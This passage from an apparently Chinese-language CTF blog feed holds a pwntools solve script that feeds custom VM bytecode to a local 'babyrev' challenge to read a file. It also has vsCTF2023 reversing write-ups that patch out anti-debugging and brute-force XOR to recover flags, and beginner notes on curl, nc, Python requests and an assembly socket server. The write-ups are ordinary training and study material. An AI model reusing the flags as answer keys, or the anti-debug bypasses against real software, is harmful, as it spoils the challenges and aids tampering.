class="string">interpret_imm(&#x27;opcode[1024]&#x27;,0) # addr = opcode[0 + 768]</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,0)</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,0)</span></span><br><span class="line"><span class="string">open()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,0x50) # len</span></span><br><span class="line"><span class="string">read()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1024]&#x27;,1)</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,0)</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,0x50) # len</span></span><br><span class="line"><span class="string">write()</span></span><br><span class="line"><span class="string">exitPro()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">opcode = []</span><br><span class="line">opcode_func = opcode_func.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># print(opcode_func)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> opcode_func:</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    p48 = <span class="built_in">eval</span>(i)</span><br><span class="line">    opcode.append(p48 &amp; <span class="number">0xff</span>)</span><br><span class="line">    opcode.append((p48 &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>)</span><br><span class="line">    opcode.append((p48 &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>)</span><br><span class="line">opcode+=([<span class="number">0</span>] * (<span class="number">0x300</span> - <span class="built_in">len</span>(opcode)))</span><br><span class="line"></span><br><span class="line">a = opcode</span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line">a = <span class="string">b&#x27;&#x27;</span>.join([<span class="built_in">bytes</span>([i]) <span class="keyword">for</span> i <span class="keyword">in</span> a])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyrev_level22.0&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;This time, YOU&#x27;RE in control! Please input your yancode: &quot;</span>,a)</span><br><span class="line">p.interactive()</span><br><span class="line">p.kill()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>vsCTF2023</title>
    <url>/2023/09/25/vsCTF/</url>
    <content><![CDATA[<h6 id="preface-快结束了才知道反正么挺快做了三个题虽然讲实话很多东西真没看懂但是逆向么出了就行"><a class="markdownIt-Anchor" href="#preface-快结束了才知道反正么挺快做了三个题虽然讲实话很多东西真没看懂但是逆向么出了就行">#</a> PREFACE: 快结束了才知道，反正么挺快做了三个题，虽然讲实话很多东西真没看懂，但是逆向么出了就行…</h6>
<h6 id="后面的三个题解好少先看别的地方的题去了"><a class="markdownIt-Anchor" href="#后面的三个题解好少先看别的地方的题去了">#</a> 后面的三个题解好少… 先看别的地方的题去了…</h6>
<h6 id="ps-这题怎么越做越多"><a class="markdownIt-Anchor" href="#ps-这题怎么越做越多">#</a> ps. 这题怎么越做越多…</h6>
<span id="more"></span>
<h4 id="x0rr3al"><a class="markdownIt-Anchor" href="#x0rr3al">#</a> x0rr3al</h4>
<h6 id="早知道c语言有一个main调用main的操作似乎是为数不多c不支持的c操作但是这里好像第一次见了"><a class="markdownIt-Anchor" href="#早知道c语言有一个main调用main的操作似乎是为数不多c不支持的c操作但是这里好像第一次见了">#</a> 早知道 c 语言有一个 main 调用 main 的操作，似乎是为数不多 c++ 不支持的 c 操作？但是这里好像第一次见了？</h6>
<p>存在反调，可以下掉反调看 check，或者直接看逻辑</p>
<p><code>sub_5560774764F7</code>  ： 一个简单异或 <code>0x12</code></p>
<p><code>sub_55607747650A</code> ： 递归异或一个初始化好的表</p>
<p>单字节加密 flag，全是异或，这里不需要提取，直接爆破即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;=&gt;8566#&gt;8=).(;9?6.(;9?&#x27;</span></span><br><span class="line"><span class="comment"># for i in a:</span></span><br><span class="line"><span class="comment">#     print(chr(ord(i) ^ 0x5A),end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># print()</span></span><br><span class="line">b = <span class="string">f&quot;af&amp;`f2`!d!`a#|u2fz#&#x27;2qz&amp;~#2j\&quot;``!s~333&quot;</span></span><br><span class="line"><span class="comment"># for i in b:</span></span><br><span class="line"><span class="comment">#     print(chr(ord(i) ^ 0x12),end=&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">dest = <span class="string">&#x27;s3cR3ts3vsctfvsctiamfrnow0kkeyw0wkeyw&#x27;</span></span><br><span class="line"></span><br><span class="line">lld = [ <span class="number">0x7E</span>, <span class="number">0x7B</span>, <span class="number">0x6B</span>, <span class="number">0x7C</span>, <span class="number">0x6E</span>, <span class="number">0x73</span>, <span class="number">0x7F</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x63</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x3C</span>, <span class="number">0x66</span>, <span class="number">0x7C</span>, <span class="number">0x39</span>, <span class="number">0x57</span>, <span class="number">0x6C</span>, <span class="number">0x3B</span>, <span class="number">0x6A</span>, <span class="number">0x7D</span>,</span><br><span class="line">  <span class="number">0x6F</span>, <span class="number">0x6F</span>, <span class="number">0x3B</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x57</span>,  <span class="number">0x3C</span>, <span class="number">0x7A</span>, <span class="number">0x3B</span>, <span class="number">0x57</span>, <span class="number">0x66</span>, <span class="number">0x38</span>, <span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x7C</span>,</span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x60</span>, <span class="number">0x57</span>, <span class="number">0x6E</span>, <span class="number">0x38</span>, <span class="number">0x7A</span>, <span class="number">0x57</span>, <span class="number">0x7C</span>, <span class="number">0x60</span>, <span class="number">0x3B</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x3B</span>, <span class="number">0x39</span>, <span class="number">0x3B</span>, <span class="number">0x3B</span>, <span class="number">0x3F</span>, <span class="number">0x75</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(lld))</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(len(lld)):</span></span><br><span class="line"><span class="comment">#     print(chr(lld[i] ^ 0x12 ^ ord(dest[11]) ^ ord(dest[0]) ^ ord(dest[22]) ^ ord(dest[33]) ^ ord(dest[44])),end=&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span> + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> lld:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(i ^ j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># vsctf&#123;w34k_4nt1_d3bugg3rs_4r3_n0_m4tch_f0r_th3_31337&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id><a class="markdownIt-Anchor" href="#">#</a> </h4>
<h4 id="challange"><a class="markdownIt-Anchor" href="#challange">#</a> challange</h4>
<p>用比较复杂的 stl（主要是 <code>vector</code>  和 <code>string</code> ）进行数据操作，做了个类似 RSA 的 <code>乘方+取模</code> 然后加点异或生成了一个 vector 用于加密，但是加密逻辑只有异或，flag 是 50 位的</p>
<p><img loading="lazy" data-src="vsCTF/image-20230925110429523.png" alt="image-20230925110429523"></p>
<p>这里不需要硬逆逻辑，下掉 <code>ptrace</code>  反调（这里原本有 exit (0); 已经 nop 掉了）</p>
<p><img loading="lazy" data-src="vsCTF/image-20230925110532965.png" alt="image-20230925110532965"></p>
<p>在 check 的地方把检查逻辑改掉（改成如果不相等则退出）</p>
<p><img loading="lazy" data-src="vsCTF/image-20230925110635140.png" alt="image-20230925110635140"></p>
<p>提取异或的 key 数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_reg_value(<span class="string">&quot;ebx&quot;</span>)) , end = <span class="string">&#x27;, &#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>直接梭就行（这里输入的是全 1 的 flag，flag 也刚好没有 1，可以多用几个试几次）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">149</span>, <span class="number">148</span>, <span class="number">5</span>, <span class="number">88</span>, <span class="number">128</span>, <span class="number">22</span>, <span class="number">47</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">117</span>, <span class="number">311</span>, <span class="number">57</span>, <span class="number">145</span>, <span class="number">224</span>, <span class="number">32</span>, <span class="number">112</span>, <span class="number">77</span>, <span class="number">185</span>, <span class="number">25</span>, <span class="number">59</span>, <span class="number">79</span>, <span class="number">4</span>, <span class="number">31</span>, <span class="number">184</span>, <span class="number">156</span>, <span class="number">79</span>, <span class="number">241</span>, <span class="number">179</span>, <span class="number">162</span>, <span class="number">68</span>, <span class="number">119</span>, <span class="number">244</span>, <span class="number">92</span>, <span class="number">109</span>, <span class="number">29</span>, <span class="number">47</span>, <span class="number">123</span>, <span class="number">154</span>, <span class="number">33</span>, <span class="number">224</span>, <span class="number">223</span>, <span class="number">125</span>, <span class="number">159</span>, <span class="number">194</span>, <span class="number">116</span>, <span class="number">63</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">199</span>, <span class="number">250</span>, <span class="number">0</span>]</span><br><span class="line"><span class="comment"># for i in range(len(enc)):</span></span><br><span class="line"><span class="comment">#     print(chr(enc[i] ^ i),end=&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;11111111111111111111111111111111111111111111111111&#x27;</span></span><br><span class="line"></span><br><span class="line">b = [<span class="number">0xd2</span>, <span class="number">0xd6</span>, <span class="number">0x57</span>, <span class="number">0x1d</span>, <span class="number">0xd7</span>, <span class="number">0x5c</span>, <span class="number">0x78</span>, <span class="number">0x22</span>, <span class="number">0xe7</span>, <span class="number">0x7</span>, <span class="number">0x131</span>, <span class="number">0x39</span>, <span class="number">0x90</span>, <span class="number">0x9f</span>, <span class="number">0x25</span>, <span class="number">0xd</span>, <span class="number">0x23</span>, <span class="number">0xb8</span>, <span class="number">0x58</span>, <span class="number">0x55</span>, <span class="number">0x9</span>, <span class="number">0x6a</span>, <span class="number">0x6d</span>, <span class="number">0xe6</span>, <span class="number">0xc0</span>, <span class="number">0xe</span>, <span class="number">0xa5</span>, <span class="number">0xf6</span>, <span class="number">0xfa</span>, <span class="number">0x1</span>, <span class="number">0x2f</span>, <span class="number">0xb3</span>, <span class="number">0x8</span>, <span class="number">0x3</span>, <span class="number">0x7c</span>, <span class="number">0x6c</span>, <span class="number">0x25</span>, <span class="number">0xcc</span>, <span class="number">0x4f</span>, <span class="number">0x85</span>, <span class="number">0xab</span>, <span class="number">0x1</span>, <span class="number">0xfe</span>, <span class="number">0xbf</span>, <span class="number">0x4</span>, <span class="number">0x5a</span>, <span class="number">0x70</span>, <span class="number">0x94</span>, <span class="number">0xc9</span>, <span class="number">0xb6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(0xd2 ^ ord(&#x27;1&#x27;))</span></span><br><span class="line"><span class="comment"># print(227 ^ 149)</span></span><br><span class="line"><span class="comment"># print(chr(227 ^ 149))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i] ^ b[i] ^ <span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># vsctf&#123;fUnC710N4L_0p_w_Competitive_Prog_TEMPLATES?&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="teenage-wasm"><a class="markdownIt-Anchor" href="#teenage-wasm">#</a> teenage-wasm</h4>
<h6 id="说实话第一次做wasm"><a class="markdownIt-Anchor" href="#说实话第一次做wasm">#</a> 说实话第一次做 wasm…</h6>
<p>插件： <a href="https://github.com/nneonneo/ghidra-wasm-plugin/releases/tag/v2.1.0">Release Version 2.1.0 · nneonneo/ghidra-wasm-plugin (github.com)</a></p>
<p>选择的是 <code>Ghidra + wasm</code>  插件的反编译方案，还是比较清晰的</p>
<p><img loading="lazy" data-src="vsCTF/image-20230925111041089.png" alt="image-20230925111041089"></p>
<p>可以拿到一个 js 代码，和一个 wasm 代码，这里找不到 button 的处理 handle，纠结了很久，然后友 web 手说可能是 wasm 里面注册了监听，orz 真该学学 web 了…</p>
<p>js 代码中大概是  <code>wasm-bindgen</code>  编译的与 wasm 交互的产物，只负责中间件，将字符串共享给 wasm，并接收共享字符串</p>
<p>可以直接来看 wasm，代码很多，rust 编译的也相对抽象，经过前面说的可能是监听的 button 可以翻翻代码，然后发现了这个</p>
<p><img loading="lazy" data-src="vsCTF/image-20230925111803725.png" alt="image-20230925111803725"></p>
<p><code>flush_messages</code></p>
<p><img loading="lazy" data-src="vsCTF/image-20230925111851725.png" alt="image-20230925111851725"></p>
<p>加密逻辑也很显眼…</p>
<p>虽然其实还并不是狠看懂这个怎么传回去的，但是提取数据异或一下真的就是 flag 了…（他真的很喜欢异或）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_list = [<span class="string">&quot;7a&quot;</span>,</span><br><span class="line"><span class="string">&quot;5158577471345867&quot;</span>,</span><br><span class="line"><span class="string">&quot;4a77746f79675a70&quot;</span>,</span><br><span class="line"><span class="string">&quot;6a4d5a776d716272&quot;</span>,</span><br><span class="line"><span class="string">&quot;46625f373333316d&quot;</span>,</span><br><span class="line"><span class="string">&quot;73617765766f6c69&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">b_list = [<span class="string">&quot;07&quot;</span>,</span><br><span class="line"><span class="string">&quot;1f16203f4345352d&quot;</span>,</span><br><span class="line"><span class="string">&quot;123a201a2e170515&quot;</span>,</span><br><span class="line"><span class="string">&quot;072229441a103d06&quot;</span>,</span><br><span class="line"><span class="string">&quot;760c00445a6c5c1e&quot;</span>,</span><br><span class="line"><span class="string">&quot;47160c03020c1f1f&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    a = [<span class="built_in">int</span>(a_list[i][j: j + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a_list[i]), <span class="number">2</span>)]</span><br><span class="line">    b = [<span class="built_in">int</span>(b_list[i][j: j + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b_list[i]), <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(a[j] ^ b[j])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># vsctf&#123;w4sm_is_n0t_aw3some_pWuTMXJmq2KwNN&#125;</span></span><br></pre></td></tr></table></figure>
<h6 id="9-26-感觉本来wasm就见得不多会做的更是少还是不要草草结束了这个题把他给逆完整一点"><a class="markdownIt-Anchor" href="#9-26-感觉本来wasm就见得不多会做的更是少还是不要草草结束了这个题把他给逆完整一点">#</a> 9-26: 感觉本来 wasm 就见得不多，会做的更是少，还是不要草草结束了这个题，把他给逆完整一点</h6>
<p>直觉上 <code>flesh_message</code>  既然找不到 <code>x-ref</code> ，应该还是有更多处理逻辑的，首先是这里的比对</p>
<p><img loading="lazy" data-src="vsCTF/image-20230926204837431.png" alt="image-20230926204837431"></p>
<p>local_18 拿到了 param2（即用户的一个输入），与 <code>admin</code>  字符串进行了比对，如果不是 admin 会返回 Login fail 的提示</p>
<p><img loading="lazy" data-src="vsCTF/image-20230926205045674.png" alt="image-20230926205045674"></p>
<p><img loading="lazy" data-src="vsCTF/image-20230926205146253.png" alt="image-20230926205146253"></p>
<h6 id="可以右键更换数据类型"><a class="markdownIt-Anchor" href="#可以右键更换数据类型">#</a> （可以右键更换数据类型）</h6>
<p>这个地方感觉有机会，看看下面，找到了类似的结构：</p>
<p><img loading="lazy" data-src="vsCTF/image-20230926205948905.png" alt="image-20230926205948905"></p>
<p>但是这里没那么明显，先试试我怎么出的：</p>
<p>这里除去 <code>admin</code>  已经没有明显的全局变量了，能包含有字符信息的内容不多，然后突然意识到这里全都是可见字符：<img loading="lazy" data-src="vsCTF/image-20230926210857339.png" alt="image-20230926210857339"></p>
<p>那其实很蹊跷了，打印一下看看</p>
<p><img loading="lazy" data-src="vsCTF/image-20230926210952849.png" alt="image-20230926210952849"></p>
<p>感觉就很明显了，有明显的英文语法痕迹（？）</p>
<p>逆转过来：</p>
<p><img loading="lazy" data-src="vsCTF/image-20230926211040498.png" alt="image-20230926211040498"></p>
<p>这个就是密码…</p>
<p><img loading="lazy" data-src="vsCTF/image-20230926211059432.png" alt="image-20230926211059432"></p>
<p>回来看看逻辑，到底放在哪里</p>
<p>前面没注意，但是这里有个很明显的把参数提取成 utf-8 的操作：</p>
<p><img loading="lazy" data-src="vsCTF/image-20230926211238954.png" alt="image-20230926211238954"></p>
<p>然后存储 <code>local_18</code>  -&gt;  <code>local_68</code>  在下面进行比较</p>
<p>还是对这些符号不够敏感…</p>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>web入门操作</title>
    <url>/2024/04/14/web%E5%85%A5%E9%97%A8%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h6 id="preface"><a class="markdownIt-Anchor" href="#preface">#</a> PREFACE：</h6>
<span id="more"></span>
<h3 id="curl"><a class="markdownIt-Anchor" href="#curl">#</a> curl</h3>
<ul>
<li>curl 发送 get 指令</li>
</ul>
<blockquote>
<p>curl 127.0.0.1 -p 80</p>
</blockquote>
<p>注意 url 编码</p>
<p>添加 header</p>
<blockquote>
<p>curl 127.0.0.1 -p 80 --header “Host:40bb89ca76728698378750073647169d”</p>
</blockquote>
<p>注意转义</p>
<blockquote>
<p>curl 127.0.0.1?a=963fe9d3ff95f80bff64f57c210a739f<br>
\&amp;b=f8e12324%202bbd1304%2634341212%231eebbb9b</p>
</blockquote>
<p>POST data：</p>
<blockquote>
<p>curl 127.0.0.1 -d a=5129ddc180c847f3788d5493e2fdea93</p>
</blockquote>
<p>发送 json（json 内不需要转义）</p>
<blockquote>
<p>curl 127.0.0.1:80 -H “Content-Type:application/json” -d ‘{“a”:“17aa707fc88e62cab3cf40403d43e025”,“b”:{“c”:“6869f0a6”,“d”:[“193c021a”,“1de1e1a0 9384ce04&amp;8ae5cbbb#6<br>
eabcff1”]}}’</p>
</blockquote>
<p>重定向</p>
<blockquote>
<p>curl 127.0.0.1 --location-trusted</p>
</blockquote>
<p>获取 cookie</p>
<blockquote>
<p>curl -c - 127.0.0.1:80</p>
</blockquote>
<p>发送 cookie</p>
<blockquote>
<p>curl --cookie 71ed1a72ed58d7146e2798f2945a11dc 127.0.0.1</p>
</blockquote>
<h3 id="nc"><a class="markdownIt-Anchor" href="#nc">#</a> nc</h3>
<ul>
<li>nc 发送 get 指令</li>
</ul>
<blockquote>
<p>printf “GET /index.html HTTP/1.1\r\nUser-Agent: nc/0.0.1\r\nHost: 127.0.0.1\r\nAccept: <em>/</em>\r\n\r\n” | nc 127.0.0.1 80</p>
</blockquote>
<p>注意：更改为其他 input 方式，否则 url 编码会过不了</p>
<blockquote>
<p>hacker@talking-web~level14:/$ nc 127.0.0.1 80<br>
GET /index.html?a=a1834ce5ff3a8434e97e721b647e84a0 HTTP/1.1</p>
</blockquote>
<p>可以：nc 127.0.0.1 80 &lt; exp.txt</p>
<p>tips: 这里 nc 会自动把 \n 处理成 \r\n</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line">Content-Length: 34</span><br><span class="line"></span><br><span class="line">a=b7f875a1d22f3884e72c830ccd2dae79</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 40</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&quot;fb1fcbc678ea9ab1c60e7d89291a6ad0&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>nc 信任重定向</p>
<p>cookie：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /08ef55da8a1e676feea750320e3b0942 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 116</span><br><span class="line">Cookie: cookie=c106c3a4d0d7620eee3b2cd121ff77ec</span><br><span class="line">Referer: 127.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="python"><a class="markdownIt-Anchor" href="#python">#</a> python</h3>
<ul>
<li>python 发送 get（不需要 url 编码）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&quot;71da60ef1b789332773275354004e689&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(<span class="string">&quot;http://127.0.0.1:80&quot;</span>,params=&#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;62e9fb4ed3b5fafd87b163b3a20fef5b&quot;</span>,<span class="string">&quot;b&quot;</span>:<span class="string">&quot;93db500a 663544b4&amp;c0fa24b2#5b3824c1&quot;</span>&#125;,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
<ul>
<li>post</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">data = &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;fb7a58692e22a3fc71c5017aa0541b00&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&quot;71da60ef1b789332773275354004e689&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded; charset=utf-8&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(<span class="string">&quot;http://127.0.0.1:80&quot;</span>,data=data,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
<p>json</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">data = &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;cb449746a07887172af1ad3bc700d7cc&quot;</span>,<span class="string">&quot;b&quot;</span>:<span class="string">&quot;6b0e7b4b 208ac3c8&amp;2a6652a6#b948b54f&quot;</span>&#125;</span><br><span class="line">data = json.dumps(data)</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&quot;71da60ef1b789332773275354004e689&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(<span class="string">&quot;http://127.0.0.1:80&quot;</span>,data=data,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
<p>Python 自动重定向</p>
<p>Python 不需要手动维护 cookie</p>
<h3 id="web-syscall"><a class="markdownIt-Anchor" href="#web-syscall">#</a> web syscall</h3>
<p>network system calls are mostly big endian</p>
<p>ip protocol socket:</p>
<blockquote>
<p>socket(AF_INET, SOCK_STREAM, IPPROTO_IP)</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdi, 2</span><br><span class="line">mov rsi, 1</span><br><span class="line">mov rdx, 0</span><br><span class="line">mov rax, 41</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>bind:</p>
<blockquote>
<p>bind(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(“0.0.0.0”)}, 16)</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub rsp, 4</span><br><span class="line">mov word ptr [rsp], 2</span><br><span class="line">mov word ptr [rsp + 3], 80</span><br><span class="line">mov dword ptr [rsp + 4], 0x00000000</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">mov rdi, rax</span><br><span class="line">mov rdx, 16</span><br><span class="line">mov rax, 49</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>accept</p>
<blockquote>
<p>accept(3, NULL, NULL)</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdi, 3</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdx, rdx</span><br><span class="line">mov rax, 43</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>进行接收 &amp; 回包</p>
<blockquote>
<p>[✓] execve(“/proc/self/fd/3”, [“/proc/self/fd/3”], 0x7f0eeb6ad980 /* 0 vars */) = 0<br>
[✓] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3<br>
[✓] bind(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(“0.0.0.0”)}, 16) = 0<br>
[✓] listen(3, 0)                            = 0<br>
[✓] accept(3, NULL, NULL)                   = 4<br>
[✓] read(4, “GET / HTTP/1.1\r\nHost: localhost\r\nUser-Agent: python-requests/2.31.0\r\nAccept-Encoding: gzip, deflate, zstd\r\nAccept: <em>/</em>\r\nConnection: keep-alive\r\n\r\n”, 10000) = 146<br>
[✓] write(4, “HTTP/1.0 200 OK\r\n\r\n”, 19) = 19<br>
[✓] close(4)                                = 0<br>
[✓] exit(0)                                 = ?</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41</span><br><span class="line">    syscall</span><br><span class="line">    sub rsp, 4</span><br><span class="line">    mov word ptr [rsp], 2</span><br><span class="line">    mov word ptr [rsp + 3], 80</span><br><span class="line">    mov dword ptr [rsp + 4], 0x00000000</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx, 10000</span><br><span class="line">    xor rax, rax</span><br><span class="line">    syscall</span><br><span class="line">    sub rsp, 19</span><br><span class="line">    mov dword ptr [rsp], 0x50545448</span><br><span class="line">    mov dword ptr [rsp + 4], 0x302e312f</span><br><span class="line">    mov dword ptr [rsp + 8], 0x30303220</span><br><span class="line">    mov dword ptr [rsp + 12], 0x0d4b4f20</span><br><span class="line">    mov qword ptr [rsp + 16], 0xa0d0a</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据接包进行 get 请求：</p>
